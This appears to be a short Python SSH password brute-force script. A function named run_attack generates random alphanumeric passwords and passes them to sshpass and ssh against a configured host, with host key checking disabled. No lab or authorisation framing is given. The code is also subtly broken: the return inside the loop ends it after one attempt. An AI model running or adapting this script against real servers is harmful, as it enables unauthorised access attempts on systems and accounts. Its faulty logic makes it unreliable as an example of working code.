import random
import string
import subprocess

from config import SSH_HOST, SSH_PORT, SSH_USER


def random_password(length=10):
    alphabet = string.ascii_letters + string.digits
    return "".join(random.choice(alphabet) for _ in range(length))


def run_attack():

    while True:

        password = random_password()

        print(f"Trying: {password}")

        result =subprocess.run(
            [
                "sshpass",
                "-p",
                password,
                "ssh",
                "-p",
                str(SSH_PORT),
                "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null",
                f"{SSH_USER}@{SSH_HOST}",
                "echo Connected"
            ],
            capture_output=True,
            text=True
        )

        return result


if __name__ == "__main__":
    run_attack()